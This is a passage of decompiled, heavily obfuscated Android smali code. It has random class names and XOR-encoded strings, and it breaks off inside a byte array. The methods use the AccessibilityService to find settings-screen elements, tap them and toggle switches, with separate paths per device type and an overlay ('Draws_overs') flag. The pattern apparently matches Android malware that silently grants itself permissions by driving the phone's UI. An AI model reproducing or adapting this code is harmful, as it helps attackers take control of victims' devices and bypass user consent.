    invoke-static {v0, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->O:Ljava/lang/String;

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->P1(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->F0()V

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :goto_0
    return-void
.end method

.method private static Q2()V
    .locals 3

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {v0, v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->A0()V

    return-void

    :array_0
    .array-data 1
        -0x48t
        0x3dt
        0x24t
        -0x74t
        -0x19t
        -0x3et
        0x2ct
    .end array-data

    :array_1
    .array-data 1
        -0x2ct
        0x52t
        0x45t
        -0x18t
        -0x7at
        -0x4et
        0x5ct
        0x7ct
    .end array-data
.end method

.method public static synthetic R()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->K2()V

    return-void
.end method

.method private static R0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 7

    .line 1
    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v0

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_1

    const/4 v0, 0x1

    goto :goto_0

    :cond_1
    move v0, v1

    :goto_0
    if-nez v0, :cond_3

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_3

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x:[Ljava/lang/String;

    array-length v4, v3

    :goto_1
    if-ge v1, v4, :cond_3

    aget-object v5, v3, v1

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_2

    goto :goto_2

    :cond_2
    add-int/lit8 v1, v1, 0x1

    goto :goto_1

    :cond_3
    if-eqz v0, :cond_4

    :goto_2
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerX()I

    move-result v1

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    invoke-static {v1, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_4
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    return-void
.end method

.method private static synthetic R1()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k1()V

    return-void
.end method

.method private static R2(Ljava/util/List;)V
    .locals 2

    .line 1
    invoke-interface {p0}, Ljava/util/List;->size()I

    move-result v0

    const/4 v1, 0x1

    if-le v0, v1, :cond_0

    invoke-interface {p0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-interface {p0, v1}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    invoke-interface {p0, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    return-void
.end method

.method public static synthetic S(Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->p2(Landroid/content/Context;)V

    return-void
.end method

.method private static S0()V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x1a

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x96

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-array v0, v1, [B

    fill-array-data v0, :array_2

    new-array v1, v3, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q1(Ljava/lang/String;)V

    goto :goto_0

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        -0x39t
        0x61t
        -0x5et
        -0x70t
        0x54t
        -0x1bt
        0x4at
        -0x17t
        -0x31t
        0x6bt
        -0x17t
        -0x6ft
        0x5et
        -0x13t
        0x5ct
        -0x50t
        -0x32t
        0x50t
        -0x4bt
        -0x70t
        0x58t
        -0x2dt
        0x5at
        -0x4at
        -0x22t
        0x7bt
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x5at
        0xft
        -0x3at
        -0x1et
        0x3bt
        -0x74t
        0x2et
        -0x2dt
    .end array-data

    :array_2
    .array-data 1
        -0x39t
        -0x38t
        -0x7et
        0x57t
        0x6bt
        0x4bt
        -0x69t
        -0x4dt
        -0x31t
        -0x3et
        -0x37t
        0x56t
        0x61t
        0x43t
        -0x7ft
        -0x16t
        -0x32t
        -0x7t
        -0x6bt
        0x57t
        0x67t
        0x7dt
        -0x79t
        -0x14t
        -0x22t
        -0x2et
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x5at
        -0x5at
        -0x1at
        0x25t
        0x4t
        0x22t
        -0xdt
        -0x77t
    .end array-data
.end method

.method private static synthetic S1(Z)V
    .locals 0

    .line 1
    return-void
.end method

.method private static S2()Landroid/content/Context;
    .locals 1

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return-object v0

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    return-object v0
.end method

.method public static synthetic T()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L2()V

    return-void
.end method

.method private static T0(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 1

    .line 1
    if-eqz p0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isCheckable()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    if-eqz v0, :cond_0

    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_0
    return-void
.end method

.method private static synthetic T1()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->r1()V

    return-void
.end method

.method public static T2()V
    .locals 8

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/16 v1, 0x18

    const/16 v2, 0xe

    const/4 v3, 0x0

    const/4 v4, 0x1

    const/16 v5, 0x8

    if-eq v0, v4, :cond_1

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    if-ne v0, v2, :cond_2

    :cond_1
    new-array v0, v1, [B

    fill-array-data v0, :array_0

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v0, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v6

    if-nez v6, :cond_2

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_2

    new-instance v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/yz;

    invoke-direct {v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/yz;-><init>()V

    invoke-static {v0, v6}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_2
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v6, 0x2

    const/16 v7, 0x13

    if-ne v0, v6, :cond_3

    new-array v0, v7, [B

    fill-array-data v0, :array_2

    new-array v1, v5, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_a

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_a

    :goto_0
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto/16 :goto_3

    :cond_3
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v6, 0x3

    if-ne v0, v6, :cond_4

    new-array v0, v1, [B

    fill-array-data v0, :array_4

    new-array v1, v5, [B

    fill-array-data v1, :array_5

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_a

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_a

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_a

    goto :goto_0

    :cond_4
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x4

    const/16 v6, 0x27

    if-ne v0, v1, :cond_9

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Draws_overs:Ljava/lang/String;

    new-array v1, v4, [B

    aput-byte v2, v1, v3

    new-array v2, v5, [B

    fill-array-data v2, :array_6

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v6, [B

    fill-array-data v1, :array_7

    new-array v2, v5, [B

    fill-array-data v2, :array_8

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_5

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zz;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/zz;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    return-void

    :cond_5
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u:Z

    const/16 v1, 0x1f4

    if-eqz v0, :cond_7

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x28

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    new-array v3, v5, [B

    fill-array-data v3, :array_a

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    sub-int/2addr v2, v4

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0x25

    new-array v0, v0, [B

    fill-array-data v0, :array_b

    new-array v2, v5, [B

    fill-array-data v2, :array_c

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_a

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_6
    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_a

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v2, :cond_6

    new-instance v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a00;

    invoke-direct {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a00;-><init>()V

    invoke-static {v2, v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_1

    :cond_7
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0xf

    new-array v2, v2, [B

    fill-array-data v2, :array_d

    new-array v3, v5, [B

    fill-array-data v3, :array_e

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->b3(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    const/16 v0, 0x22

    new-array v0, v0, [B

    fill-array-data v0, :array_f

    new-array v2, v5, [B

    fill-array-data v2, :array_10

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    sub-int/2addr v2, v4

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-eqz v2, :cond_a

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    new-array v0, v7, [B

    fill-array-data v0, :array_11

    new-array v2, v5, [B

    fill-array-data v2, :array_12

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_a

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_a

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_8
    :goto_2
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_a

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v2, :cond_8

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_2

    :cond_9
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ev;->a()I

    move-result v0

    const/4 v1, 0x6

    if-ne v0, v1, :cond_a

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v6, [B

    fill-array-data v1, :array_13

    new-array v2, v5, [B

    fill-array-data v2, :array_14

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_a

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/b00;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/b00;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    :cond_a
    :goto_3
    return-void

    nop

    :array_0
    .array-data 1
        0xct
        -0x3t
        0x0t
        0x8t
        0x5t
        -0x5bt
        -0x5t
        -0x5ft
        0x4t
        -0x9t
        0x4bt
        0x9t
        0x1dt
        -0x5bt
        -0x15t
        -0x8t
        0x5t
        -0x34t
        0x13t
        0x13t
        0xet
        -0x55t
        -0x6t
        -0x11t
    .end array-data

    :array_1
    .array-data 1
        0x6dt
        -0x6dt
        0x64t
        0x7at
        0x6at
        -0x34t
        -0x61t
        -0x65t
    .end array-data

    :array_2
    .array-data 1
        -0x9t
        0x6dt
        0x72t
        -0x1at
        -0x37t
        0x24t
        0x6ft
        -0x48t
        -0x1t
        0x67t
        0x39t
        -0x9t
        -0x32t
        0x28t
        0x68t
        -0x17t
        -0xct
        0x6ct
        0x6et
    .end array-data

    :array_3
    .array-data 1
        -0x6at
        0x3t
        0x16t
        -0x6ct
        -0x5at
        0x4dt
        0xbt
        -0x7et
    .end array-data

    :array_4
    .array-data 1
        -0x36t
        0x10t
        0x5bt
        -0x5dt
        -0x5et
        -0x64t
        0x3et
        -0x1bt
        -0x3et
        0x1at
        0x10t
        -0x5et
